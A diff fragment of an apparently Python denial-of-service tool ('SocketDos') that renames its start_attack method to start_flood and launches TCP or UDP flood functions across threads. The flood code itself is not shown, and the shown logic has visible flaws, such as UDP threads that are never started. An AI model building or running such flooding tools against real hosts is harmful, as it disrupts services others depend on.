@@ -55,25 +55,25 @@ class SocketDos():
             sys.stdout.write(f'{request_nb} request send !\r\n')
             sys.stdout.flush()
 
-    def start_attack(self):
+    def start_flood(self):
         """
         Manage threads and choose attack method
         """
         try:
             if not self.protocol or self.protocol not in (TCP, UDP):
                 raise ValueError(f"Unsupported protocol: {self.protocol}")
-            
+
             if self.monothread:
                 if self.protocol == TCP:
                     return self.tcp_flood
                 elif self.protocol == UDP:
                     return self.udp_flood
-                
+
             else:
                 for _ in range(self.threads):
                     if self.protocol == UDP:
                         thread = Thread(target=self.udp_flood)
-                        
+
                     if self.protocol == TCP:
                         thread = Thread(target=self.tcp_flood)
                         thread.start()
